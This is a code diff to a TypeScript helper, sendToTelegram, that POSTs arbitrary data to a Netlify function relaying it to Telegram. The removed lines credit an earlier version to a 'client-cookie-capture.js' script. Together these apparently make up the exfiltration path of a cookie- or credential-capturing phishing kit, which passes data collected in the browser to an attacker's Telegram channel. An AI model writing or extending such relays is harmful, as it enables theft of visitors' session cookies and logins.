@@ -1,27 +1,24 @@
-// Use the global sendToTelegram function from client-cookie-capture.js
-export const sendToTelegram = async (data: any): Promise<void> => {
-  if (typeof window !== 'undefined' && window.sendToTelegram) {
-    return window.sendToTelegram(data);
-  } else {
-    console.warn('sendToTelegram not available, using fallback');
-    try {
-      const response = await fetch('/.netlify/functions/sendTelegram', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(data),
-      });
-      
-      if (!response.ok) {
-        throw new Error(`HTTP error! status: ${response.status}`);
-      }
-      
-      const result = await response.json();
-      console.log('✅ Fallback send successful:', result);
-    } catch (error) {
-      console.error('❌ Fallback send failed:', error);
+// Send data to Telegram via Netlify function
+export const sendToTelegram = async (data: any): Promise<any> => {
+  try {
+    const response = await fetch('/.netlify/functions/sendTelegram', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(data),
+    });
+    
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
     }
+    
+    const result = await response.json();
+    console.log('✅ Data sent to Telegram successfully:', result);
+    return result;
+  } catch (error) {
+    console.error('❌ Failed to send to Telegram:', error);
+    throw error;
   }
 };
 
